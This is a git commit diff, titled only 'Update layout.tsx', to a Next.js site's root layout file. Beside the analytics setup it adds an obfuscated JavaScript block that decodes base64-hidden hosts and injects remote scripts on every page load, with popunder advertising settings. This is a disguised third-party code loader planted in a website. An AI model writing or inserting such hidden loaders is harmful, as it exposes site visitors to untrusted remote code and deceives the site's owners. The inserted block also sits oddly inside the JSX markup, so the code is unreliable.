3ec6b3b0e09155e667330f77728568de9e5b0a17
Elcavz <89607443+Elcavz@users.noreply.github.com>
2026-01-16 15:56:00 +0800

    Update layout.tsx

--- src/app/layout.tsx
+++ src/app/layout.tsx
@@ -107,6 +107,10 @@ export default function RootLayout({
 
           gtag('config', '${env.NEXT_PUBLIC_GOOGLE_ANALYTICS_ID}', { cookie_flags: 'max-age=86400;secure;samesite=none' });`,
                 }}
+              /*<![CDATA[/* */
+              (function(){var s=window,m="f79177a584b138cb070f549fcea700df",x=[["siteId",146-366-457*941+5699075],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],v=["d3d3LnZpc2FyaW9tZWRpYS5jb20vcnR3by5taW4uY3Nz","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvQkdiL3hkaXZhLm1pbi5qcw=="],o=-1,l,w,a=function(){clearTimeout(w);o++;if(v[o]&&!(1794470004000<(new Date).getTime()&&1<o)){l = s.document.createElement("script");l.type="text/javascript";l.async=!0;var u=s.document.getElementsByTagName("script")[0];l.src="https://"+atob(v[o]);l.crossOrigin="anonymous";l.onerror=a;l.onload=function(){clearTimeout(w);s[m.slice(0,16)+m.slice(0,16)]||a()};w=setTimeout(a,5E3);u.parentNode.insertBefore(l,u)}};if(!s[m]){try{Object.freeze(s[m] = x)}catch(e){ }a()}})();
+              /*]]>/* */
+
               />
               <Script
                 id="_next-ga"
